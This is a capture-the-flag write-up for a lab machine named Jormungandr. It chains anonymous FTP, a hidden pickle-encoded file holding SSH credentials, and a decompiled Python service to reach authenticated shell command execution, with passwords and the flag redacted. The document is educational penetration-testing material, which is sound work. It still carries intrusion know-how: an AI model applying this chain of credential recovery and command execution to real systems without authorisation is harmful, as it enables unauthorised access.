---
type: writeup
platform: Exegol
room: Jormungandr
os: Linux
environment: Custom Service / Reverse Engineering

techniques:
  - anonymous-ftp
  - hidden-file-enumeration
  - data-decoding
  - pickle-analysis
  - credential-recovery
  - ssh-access
  - python-bytecode-decompilation
  - source-code-analysis
  - authenticated-command-execution

tools:
  - nmap
  - ftp
  - ssh
  - netcat
  - python3
  - pickletools
  - uncompyle6
---
**Attack path:** Anonymous FTP → hidden encoded Pickle data → `fenrir` credentials → SSH access → Python bytecode decompilation → custom-service credentials → command execution as `jormungandr`

## 1. Reconnaissance

A full TCP scan was performed:

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Three services were exposed:

```bash
21/tcp    FTP     vsftpd 3.0.5
22/tcp    SSH     OpenSSH
7432/tcp  Unknown custom service
```

FTP allowed anonymous authentication, providing the first unauthenticated enumeration path.

The custom service on port `7432` was also notable, but its purpose and authentication mechanism were not yet known.

---

## 2. Anonymous FTP Enumeration

The FTP server was accessed anonymously:

```bash
ftp <TARGET_IP>
```

```bash
Username: anonymous
Password: [empty]
```

A normal directory listing showed:

```bash
poem.txt
```

A listing including hidden files exposed an additional artifact:

```bash
ls -la
```

```bash
.yggdrasil.cache
```

The hidden file was downloaded:

```bash
get .yggdrasil.cache
```

This changed the investigation from simple FTP enumeration to analysis of an unknown encoded artifact.

---

## 3. Analysing `.yggdrasil.cache`

The file contained a long sequence of binary digits:

```bash
100000000000010010010101...
```

The preserved notes record that this bitstream was converted back into raw bytes, but the exact historical conversion command was not retained.

The resulting data began with:

```bash
80 04 95
```

This matched the header of a Python **Pickle Protocol 4** object.

Rather than loading the Pickle directly, it was inspected statically:

```bash
python3 -m pickletools yggdrasil.bin
```

The structure contained shuffled key/value entries such as:

```bash
ssh_user0
ssh_user1
...
ssh_pass0
ssh_pass1
...
```

The preserved notes record that these values were reordered according to their numeric suffixes to reconstruct an SSH credential pair. The exact historical reconstruction command or script was not preserved.

The resulting account was:

```bash
Username: fenrir
Password: <REDACTED>
```

This provided the first reusable credential discovered during the compromise.

---

## 4. SSH Access as `fenrir`

The recovered credentials were tested against the SSH service identified during reconnaissance:

```bash
ssh fenrir@<TARGET_IP>
```

Authentication succeeded.

The new identity was verified:

```bash
whoami
```

```bash
fenrir
```

Enumeration of the home directory revealed an unusual Python bytecode file:

```bash
/home/fenrir/mjollnir.pyc
```

A `.pyc` file contains compiled Python bytecode. Even without the original `.py` source, its logic can often be recovered sufficiently for analysis.

---

## 5. Reverse Engineering `mjollnir.pyc`

The bytecode was copied locally and decompiled with:

```bash
uvx uncompyle6 mjollnir-original.pyc
```

The recovered source corresponded to the custom TCP service exposed on port `7432`.

Its authentication logic reconstructed values using operations similar to:

```python
username = long_to_bytes(...)
password = long_to_bytes(...)
```

Converting the embedded integer values back into bytes revealed a second credential pair:

```bash
Username: jormungandr
Password: <REDACTED>
```

The source also showed that authenticated input was passed to:

```python
subprocess.Popen(command, shell=True, ...)
```

This was the critical finding.

The service was not merely an authenticated information endpoint. After successful authentication, it executed user-supplied shell commands.

The next step was therefore to validate both the recovered credential and the command-execution behavior against the live service.

---

## 6. Custom Service → `jormungandr`

The service was accessed with Netcat:

```bash
nc <TARGET_IP> 7432
```

Authentication used the credentials recovered from the decompiled bytecode:

```bash
Username: jormungandr
Password: <REDACTED>
```

The service accepted the login and presented a command prompt.

Command execution was validated with:

```bash
id
```

Result:

```bash
uid=1001(jormungandr) gid=1001(jormungandr)
```

This confirmed arbitrary command execution under the local account:

```bash
jormungandr
```

The user flag was then located:

```bash
find / -name user.txt 2>/dev/null
```

Result:

```bash
/home/jormungandr/user.txt
```

It was read with:

```bash
cat /home/jormungandr/user.txt
```

```bash
EPI{REDACTED}
```

The compromise had therefore progressed from anonymous FTP access to authenticated command execution as `jormungandr`.

---

## Key Takeaways

- Anonymous FTP should be enumerated with hidden files in mind; a normal directory listing did not reveal the artifact that enabled the compromise.
- Encoded data should be identified before being interpreted. The `80 04 95` header provided the clue that the reconstructed data was a Python Pickle Protocol 4 object.
- Pickle data can be inspected statically with `pickletools`, avoiding unnecessary deserialization of an untrusted object.
- Recovered credentials should be validated against exposed services rather than assumed to be useful.
- Compiled Python bytecode can still disclose authentication logic, embedded secrets and command-execution behavior.
- Reverse engineering the custom service was more useful than blindly attacking its authentication mechanism.
- Discovering credentials and discovering code execution are separate findings; both were independently confirmed against the live service.